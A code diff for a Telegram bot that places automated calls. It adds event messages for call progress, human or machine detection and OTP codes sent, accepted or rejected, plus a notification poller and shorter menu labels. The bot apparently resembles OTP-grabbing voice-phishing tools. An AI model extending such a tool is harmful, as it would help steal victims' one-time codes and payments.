@@ -30,6 +30,45 @@ const {
 const token = config.botToken;
 const bot = new Bot(token);
 
+// Styled call event renderer
+function formatCallEvent(event) {
+    const type = event.notification_type;
+    const payload = (() => {
+        try {
+            return event.payload ? JSON.parse(event.payload) : {};
+        } catch {
+            return event.payload || {};
+        }
+    })();
+
+    switch (type) {
+        case 'call_initiated':
+            return `📞 Calling ${payload.to || ''} from ${payload.from || ''}`.trim();
+        case 'call_answered':
+            return '🟢 Call has been answered.';
+        case 'call_human_detected':
+            return '🧑 Human detected.';
+        case 'call_machine_detected':
+            return '🤖 Machine detected.';
+        case 'otp_sent':
+            return `📨 Send OTP${payload.code ? `: ${payload.code}` : ''}`;
+        case 'otp_rejected':
+            return '❌ OTP code has been rejected.';
+        case 'otp_accepted':
+            return '✅ OTP code has been accepted.';
+        case 'call_outcome_summary':
+            return `📊 Call outcome: ${payload.outcome || 'unknown'}`;
+        case 'call_ended':
+            return '🔚 Call has ended.';
+        case 'recording_ready':
+            return `▶️ Recording ready: ${payload.url || ''}`.trim();
+        case 'transcript_ready':
+            return `📝 Transcript ready: ${payload.url || ''}`.trim();
+        default:
+            return `${type}`;
+    }
+}
+
 // Initialize conversations with error handling wrapper
 function wrapConversation(handler, name) {
     return createConversation(async (conversation, ctx) => {
@@ -92,6 +131,27 @@ bot.catch((err) => {
     }
 });
 
+// Poll and post pending webhook notifications as styled call feeds
+async function processPendingNotifications() {
+    try {
+        const pending = await fetchPendingNotifications(20);
+        for (const notif of pending) {
+            const text = formatCallEvent(notif);
+            try {
+                const sent = await bot.api.sendMessage(notif.telegram_chat_id, text);
+                await markNotification(notif.id, 'sent', sent.message_id, null);
+            } catch (error) {
+                console.error('Failed to send notification', notif.id, error.message);
+                await markNotification(notif.id, 'failed', null, error.message);
+            }
+        }
+    } catch (error) {
+        console.error('Notification poller error:', error.message);
+    }
+}
+
+setInterval(processPendingNotifications, 4000);
+
 async function validateTemplatesApiConnectivity() {
     if (!config.templatesApiUrl) {
         console.warn('⚠️ TEMPLATES_API_URL not configured; skipping templates health check');
@@ -139,6 +199,7 @@ const {
 } = require('./commands/provider');
 const { otpFlow, registerOtpCommand } = require('./commands/otp');
 const { paymentFlow, registerPaymentCommand } = require('./commands/payment');
+const { fetchPending: fetchPendingNotifications, markNotification } = require('./db/notifications');
 const {
     addUserFlow,
     registerAddUserCommand,
@@ -483,12 +544,12 @@ bot.command('start', async (ctx) => {
         const kb = new InlineKeyboard();
 
         // Add buttons
-        kb.text('📞 New Call', 'CALL')
-          .text('🔐 OTP Call', 'OTP')
-          .text('💳 Payment Call', 'PAYMENT')
+        kb.text('📞 Call', 'CALL')
+          .text('🔐 OTP', 'OTP')
+          .text('💳 Pay', 'PAYMENT')
           .text('📚 Guide', 'GUIDE')
             .row()
-            .text('💬 New Sms', 'SMS')
+            .text('💬 SMS', 'SMS')
             .text('🏥 Health', 'HEALTH')            
             .row()
             .text('❔ Help', 'HELP')
@@ -848,13 +909,13 @@ Contact: @${config.admin.username} for support.
 Version: 2.0.0`;
 
     const kb = new InlineKeyboard()
-        .text('📞 New Call', 'CALL')
-        .text('🔐 OTP Call', 'OTP')
-        .text('💳 Payment Call', 'PAYMENT')
+        .text('📞 Call', 'CALL')
+        .text('🔐 OTP', 'OTP')
+        .text('💳 Pay', 'PAYMENT')
         .text('📋 Commands', 'HELP')
         .row()
         .text('🔄 Main Menu', 'MENU')
-        .text('New SMS', 'SMS');
+        .text('💬 SMS', 'SMS');
 
     await ctx.reply(mainGuide, {
         parse_mode: 'Markdown',
@@ -864,15 +925,15 @@ Version: 2.0.0`;
 
 async function executeMenuCommand(ctx, isAdminUser) {
     const kb = new InlineKeyboard()
-        .text('📞 New Call', 'CALL')
-        .text('🔐 OTP Call', 'OTP')
-        .text('💳 Payment Call', 'PAYMENT')
-        .text('📱 Send SMS', 'SMS')
+        .text('📞 Call', 'CALL')
+        .text('🔐 OTP', 'OTP')
+        .text('💳 Pay', 'PAYMENT')
+        .text('💬 SMS', 'SMS')
         .row()
-        .text('📋 Recent Calls', 'CALLS')
+        .text('📋 Calls', 'CALLS')
         .text('📚 Guide', 'GUIDE')
         .row()
-        .text('🏥 Health Check', 'HEALTH')
+        .text('🏥 Health', 'HEALTH')
         .text('ℹ️ Help', 'HELP');
 
     if (isAdminUser) {
